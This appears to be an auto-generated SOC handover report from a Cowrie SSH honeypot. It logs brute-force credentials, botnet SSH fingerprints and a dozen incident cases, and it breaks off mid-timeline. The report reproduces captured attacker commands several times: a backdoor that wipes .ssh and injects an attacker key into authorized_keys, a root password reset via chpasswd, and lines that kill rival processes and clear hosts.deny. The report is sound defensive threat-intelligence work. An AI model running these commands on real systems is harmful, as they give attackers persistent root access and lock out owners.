# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-13 |
| **Generated At** | 2026-06-13T11:56:51Z |
| **Shift Time** | 11:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **58** |
| Confirmed Threats | **52** |
| False Positives Filtered | **6** (10.3%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **9** |
| High Severity Cases | **12** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **46** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **4** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **12** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 12 |
| `345gs5662d34` | 4 |
| `b'A?\xb7a\xd5\x1a\xbf\x83\xa3\xef([n:\xbcb\x91g&C\x05\'\xa6\x95\x83=\xa3A\xb9\x92\xc6\xd8+\x89\xfdeJ>}*\xbep\x9e\\\x9f\x8b&O\x01\xb3\x9f;\x19\xb4\xc1\x97\xeb\xa7{\x90\x83\x1a+\xda\x85{\xbdu\xaf\x8fFx\xb1\xa5\x02m\xbeL\x936nD\x05\xbf\xe1\x04\xd2\xdci7d\x85M\x842\xeco\x8a\xd4\xde\x82<\x18\x19\x94N;\x10\x88\x84K\x9b\x9cLh\x9bD\xf9\xee\xec\xf4\x08Q\xaa\xbe]x\x01\x10A\xa9\xdc\x94\x95\x82/\x1c\x91\xb5\xc8\xc2\xcb\x15*\xd2\xdeqC\xc0\xe7\x11\xd9\x1e\xfa\xd9}\xfa\xbfa\xfe)\xd9\xdd\xbbh\x91\xdfJ\xd1\xc23\xb2\xf9\x19\x8bT\xf6l\'\xe7,^AF\x80j\xf6\xa4-\x1d\xf5\xea\x06\xfd\x1e\xa8|yy\xe5\xaa\x83=\xe6\xc5D"&\x84\xca\x81k-\xaeB\xbc\x80X\x06\x0b\xac)\xa3\xa9\x07L\xab\xa1\xbe@g\xa3\xf1X\x8f\xd4\x01$\x84\x98,\x7fF[\xf9\x18w\x88 \xeb\x10\xe7p\xd3\xa4\xe90\xd4\xd3\x83sZq\xcd\xb2\xeb#\x11Ma\xd3\x02\xaf\xe9s\xdc=\x0c4\xc2 -\xa2\xcb6\x8f\x85\xb4f\xfd\xf0yv*x\x8d\xd4\xcb\x18"\xe9m\xa7N\xda\xa9\xc3\xcb26t\xea\x1d\x8e0na.\xb2\x84k!\xa5\xe4\xe9\x9dX\xc3\x10\x81\x11Y\xd1\x8b5d\x14&\x87\'\xd1j\xc4\x96\x00P\x9e\xfd}\xa7\xcfu\x17\x95uw!Jk^\xfc\x7fjp\x0e\xdd\x8a5\x9a\x12\xfc;m\xdb\xee\xd7\xc7\x13\x17\xf8\x08\xef\x14\xa2\xd1\x1a\x90.\x9f\x12\xa7s\x1c\x0cI\\kj\xb9\xe6\x8f\xd1\xaeh\x03S\xb7z\xca\xe7\x8c|\x93\x98lz\x19\x0f7\xa3F\xaa\x9c'` | 1 |
| `eadmin` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 5 |
| `345gs5662d34` | 4 |
| `Sa123123` | 1 |
| `asdfdsa` | 1 |
| `Yc123456@` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 5 |
| `345gs5662d34` | `345gs5662d34` | 4 |
| `root` | `Sa123123` | 1 |
| `root` | `asdfdsa` | 1 |
| `root` | `Yc123456@` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Sa123123` | `103.63.25.214` | 2026-06-13T10:08:43 |
| `root` | `3245gs5662d34` | `103.63.25.214` | 2026-06-13T10:08:47 |
| `root` | `asdfdsa` | `120.48.15.138` | 2026-06-13T10:10:39 |
| `root` | `3245gs5662d34` | `120.48.15.138` | 2026-06-13T10:10:47 |
| `root` | `Yc123456@` | `167.99.66.42` | 2026-06-13T10:13:47 |
| `root` | `3245gs5662d34` | `167.99.66.42` | 2026-06-13T10:13:49 |
| `root` | `Admin!@#456` | `113.172.124.25` | 2026-06-13T10:14:39 |
| `root` | `3245gs5662d34` | `113.172.124.25` | 2026-06-13T10:14:44 |
| `root` | `Qwerty666` | `120.48.39.73` | 2026-06-13T10:36:43 |
| `root` | `3245gs5662d34` | `120.48.39.73` | 2026-06-13T10:37:12 |
| `root` | `123@abc` | `180.76.177.88` | 2026-06-13T11:00:32 |
| `root` | `123qwe123qwe` | `180.76.177.88` | 2026-06-13T11:14:57 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **58** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 33 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 20 | 4 |
| `03a80b21afa8...` | Modern SSH client | 5 | 2 |
| `e37f354a101a...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 20 | 4 | Mirai/variant |
| `95420f9d932d...` | libssh | 7 | 2 | — |
| `03a80b21afa8...` | libssh | 5 | 2 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:SjG7FT88Rsyo"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.177.88`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.172.124.25`, `167.99.66.42`, `103.63.25.214`, `120.48.15.138`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **13** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS140293` | CHINATELECOM Jiangsu province Changzhou 5G network | 1 | MEDIUM |
| `AS45899` | VNPT Corp | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS15557` | Societe Francaise Du Radiotelephone - SFR SA | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (12)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0a5502e13418

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]214` |
| **First Seen** | 2026-06-13 10:08 |
| **Last Seen** | 2026-06-13 10:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:08:42` | `cowrie.session.connect` |
| `2026-06-13 10:08:42` | `cowrie.client.version` |
| `2026-06-13 10:08:42` | `cowrie.client.kex` |
| `2026-06-13 10:08:43` | `cowrie.login.success` |
| `2026-06-13 10:08:43` | `cowrie.session.params` |
| `2026-06-13 10:08:43` | `cowrie.command.input` |
| `2026-06-13 10:08:43` | `cowrie.command.failed` |
| `2026-06-13 10:08:44` | `cowrie.log.closed` |
| `2026-06-13 10:08:44` | `cowrie.session.params` |
| `2026-06-13 10:08:44` | `cowrie.command.input` |
| `2026-06-13 10:08:44` | `cowrie.session.file_download` |
| `2026-06-13 10:08:44` | `cowrie.log.closed` |
| `2026-06-13 10:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b8e8cf5d449

| Field | Detail |
|---|---|
| **Source IP** | `103.63.25[.]214` |
| **First Seen** | 2026-06-13 10:08 |
| **Last Seen** | 2026-06-13 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:08:47` | `cowrie.session.connect` |
| `2026-06-13 10:08:47` | `cowrie.client.version` |
| `2026-06-13 10:08:47` | `cowrie.client.kex` |
| `2026-06-13 10:08:47` | `cowrie.login.success` |
| `2026-06-13 10:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.25[.]214` to AbuseIPDB if not already reported
- [ ] Block `103.63.25[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-946dfdcae44c

| Field | Detail |
|---|---|
| **Source IP** | `120.48.15[.]138` |
| **First Seen** | 2026-06-13 10:10 |
| **Last Seen** | 2026-06-13 10:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:10:34` | `cowrie.session.connect` |
| `2026-06-13 10:10:34` | `cowrie.client.version` |
| `2026-06-13 10:10:34` | `cowrie.client.kex` |
| `2026-06-13 10:10:39` | `cowrie.login.success` |
| `2026-06-13 10:10:39` | `cowrie.session.params` |
| `2026-06-13 10:10:39` | `cowrie.command.input` |
| `2026-06-13 10:10:39` | `cowrie.command.failed` |
| `2026-06-13 10:10:40` | `cowrie.log.closed` |
| `2026-06-13 10:10:41` | `cowrie.session.params` |
| `2026-06-13 10:10:41` | `cowrie.command.input` |
| `2026-06-13 10:10:41` | `cowrie.session.file_download` |
| `2026-06-13 10:10:41` | `cowrie.log.closed` |
| `2026-06-13 10:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.15[.]138` to AbuseIPDB if not already reported
- [ ] Block `120.48.15[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-408f643184bd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.15[.]138` |
| **First Seen** | 2026-06-13 10:10 |
| **Last Seen** | 2026-06-13 10:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:10:45` | `cowrie.session.connect` |
| `2026-06-13 10:10:45` | `cowrie.client.version` |
| `2026-06-13 10:10:45` | `cowrie.client.kex` |
| `2026-06-13 10:10:47` | `cowrie.login.success` |
| `2026-06-13 10:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.15[.]138` to AbuseIPDB if not already reported
- [ ] Block `120.48.15[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94a53d083cbc

| Field | Detail |
|---|---|
| **Source IP** | `167.99.66[.]42` |
| **First Seen** | 2026-06-13 10:13 |
| **Last Seen** | 2026-06-13 10:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:13:46` | `cowrie.session.connect` |
| `2026-06-13 10:13:46` | `cowrie.client.version` |
| `2026-06-13 10:13:46` | `cowrie.client.kex` |
| `2026-06-13 10:13:47` | `cowrie.login.success` |
| `2026-06-13 10:13:47` | `cowrie.session.params` |
| `2026-06-13 10:13:47` | `cowrie.command.input` |
| `2026-06-13 10:13:47` | `cowrie.command.failed` |
| `2026-06-13 10:13:47` | `cowrie.log.closed` |
| `2026-06-13 10:13:47` | `cowrie.session.params` |
| `2026-06-13 10:13:47` | `cowrie.command.input` |
| `2026-06-13 10:13:47` | `cowrie.session.file_download` |
| `2026-06-13 10:13:47` | `cowrie.log.closed` |
| `2026-06-13 10:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.66[.]42` to AbuseIPDB if not already reported
- [ ] Block `167.99.66[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a011da9610

| Field | Detail |
|---|---|
| **Source IP** | `167.99.66[.]42` |
| **First Seen** | 2026-06-13 10:13 |
| **Last Seen** | 2026-06-13 10:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:13:49` | `cowrie.session.connect` |
| `2026-06-13 10:13:49` | `cowrie.client.version` |
| `2026-06-13 10:13:49` | `cowrie.client.kex` |
| `2026-06-13 10:13:49` | `cowrie.login.success` |
| `2026-06-13 10:13:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.99.66[.]42` to AbuseIPDB if not already reported
- [ ] Block `167.99.66[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc9e7de70281

| Field | Detail |
|---|---|
| **Source IP** | `113.172.124[.]25` |
| **First Seen** | 2026-06-13 10:14 |
| **Last Seen** | 2026-06-13 10:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:14:38` | `cowrie.session.connect` |
| `2026-06-13 10:14:38` | `cowrie.client.version` |
| `2026-06-13 10:14:39` | `cowrie.client.kex` |
| `2026-06-13 10:14:39` | `cowrie.login.success` |
| `2026-06-13 10:14:40` | `cowrie.session.params` |
| `2026-06-13 10:14:40` | `cowrie.command.input` |
| `2026-06-13 10:14:40` | `cowrie.command.failed` |
| `2026-06-13 10:14:40` | `cowrie.log.closed` |
| `2026-06-13 10:14:40` | `cowrie.session.params` |
| `2026-06-13 10:14:40` | `cowrie.command.input` |
| `2026-06-13 10:14:41` | `cowrie.session.file_download` |
| `2026-06-13 10:14:41` | `cowrie.log.closed` |
| `2026-06-13 10:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.172.124[.]25` to AbuseIPDB if not already reported
- [ ] Block `113.172.124[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f16c066e342

| Field | Detail |
|---|---|
| **Source IP** | `113.172.124[.]25` |
| **First Seen** | 2026-06-13 10:14 |
| **Last Seen** | 2026-06-13 10:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:14:43` | `cowrie.session.connect` |
| `2026-06-13 10:14:43` | `cowrie.client.version` |
| `2026-06-13 10:14:43` | `cowrie.client.kex` |
| `2026-06-13 10:14:44` | `cowrie.login.success` |
| `2026-06-13 10:14:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.172.124[.]25` to AbuseIPDB if not already reported
- [ ] Block `113.172.124[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e87b32173920

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]73` |
| **First Seen** | 2026-06-13 10:36 |
| **Last Seen** | 2026-06-13 10:37 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:36:40` | `cowrie.session.connect` |
| `2026-06-13 10:36:40` | `cowrie.client.version` |
| `2026-06-13 10:36:41` | `cowrie.client.kex` |
| `2026-06-13 10:36:43` | `cowrie.login.success` |
| `2026-06-13 10:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]73` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-180465fcdff9

| Field | Detail |
|---|---|
| **Source IP** | `120.48.39[.]73` |
| **First Seen** | 2026-06-13 10:37 |
| **Last Seen** | 2026-06-13 10:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 10:37:08` | `cowrie.session.connect` |
| `2026-06-13 10:37:09` | `cowrie.client.version` |
| `2026-06-13 10:37:09` | `cowrie.client.kex` |
| `2026-06-13 10:37:12` | `cowrie.login.success` |
| `2026-06-13 10:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.39[.]73` to AbuseIPDB if not already reported
- [ ] Block `120.48.39[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0aa4ac44c6d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.177[.]88` |
| **First Seen** | 2026-06-13 11:00 |
| **Last Seen** | 2026-06-13 11:02 |
| **Session Duration** | 124s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SjG7FT88Rsyo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 11:00:28` | `cowrie.session.connect` |
| `2026-06-13 11:00:28` | `cowrie.client.version` |
| `2026-06-13 11:00:28` | `cowrie.client.kex` |
| `2026-06-13 11:00:32` | `cowrie.login.success` |
| `2026-06-13 11:00:34` | `cowrie.session.params` |
| `2026-06-13 11:00:34` | `cowrie.command.input` |
| `2026-06-13 11:00:34` | `cowrie.command.failed` |
| `2026-06-13 11:00:35` | `cowrie.log.closed` |
| `2026-06-13 11:00:35` | `cowrie.session.params` |
| `2026-06-13 11:00:35` | `cowrie.command.input` |
| `2026-06-13 11:00:36` | `cowrie.session.file_download` |
| `2026-06-13 11:00:36` | `cowrie.log.closed` |
| `2026-06-13 11:00:52` | `cowrie.session.params` |
| `2026-06-13 11:00:52` | `cowrie.command.input` |
| `2026-06-13 11:00:53` | `cowrie.log.closed` |
| `2026-06-13 11:00:59` | `cowrie.session.params` |
| `2026-06-13 11:00:59` | `cowrie.command.input` |
| `2026-06-13 11:01:00` | `cowrie.log.closed` |
| `2026-06-13 11:01:01` | `cowrie.session.params` |
| `2026-06-13 11:01:01` | `cowrie.command.input` |
| `2026-06-13 11:01:01` | `cowrie.session.file_download` |
| `2026-06-13 11:01:01` | `cowrie.log.closed` |
| `2026-06-13 11:01:03` | `cowrie.session.params` |
| `2026-06-13 11:01:03` | `cowrie.command.input` |
| `2026-06-13 11:01:05` | `cowrie.log.closed` |
| `2026-06-13 11:01:05` | `cowrie.session.params` |
| `2026-06-13 11:01:05` | `cowrie.command.input` |
| `2026-06-13 11:01:06` | `cowrie.log.closed` |
| `2026-06-13 11:01:08` | `cowrie.session.params` |
| `2026-06-13 11:01:08` | `cowrie.command.input` |
| `2026-06-13 11:01:08` | `cowrie.command.input` |
| `2026-06-13 11:01:11` | `cowrie.log.closed` |
| `2026-06-13 11:01:15` | `cowrie.session.params` |
| `2026-06-13 11:01:15` | `cowrie.command.input` |
